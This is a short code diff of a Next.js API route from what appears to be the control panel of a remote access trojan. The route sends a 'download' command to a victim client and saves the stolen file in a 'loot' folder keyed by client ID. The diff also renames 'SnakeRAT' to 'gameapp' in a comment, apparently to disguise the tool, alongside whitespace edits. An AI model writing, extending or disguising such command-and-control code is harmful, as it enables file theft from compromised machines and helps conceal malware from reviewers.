@@ -16,11 +16,11 @@ async function sendAndWait(
   const db = await getDatabase()
 
   // Create command record
-  const cmd = await createCommand({ 
-    client_id: clientId, 
-    command_type: commandType, 
-    command_name: commandType, 
-    parameters: params 
+  const cmd = await createCommand({
+    client_id: clientId,
+    command_type: commandType,
+    command_name: commandType,
+    parameters: params
   })
 
   // Poll for result
@@ -65,7 +65,7 @@ export async function GET(request: NextRequest) {
       const result = await sendAndWait(clientId, 'download', { path: filePath }, 60000)
       if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
 
-      // Files are stored by SnakeRAT in: loot/<clientId>/file/<filename>
+      // Files are stored by gameapp in: loot/<clientId>/file/<filename>
       const filename = result.filename || path.basename(filePath)
       const lootBase = path.resolve(process.cwd(), '..', 'loot')
       const lootPath = path.join(lootBase, clientId, 'file', filename)
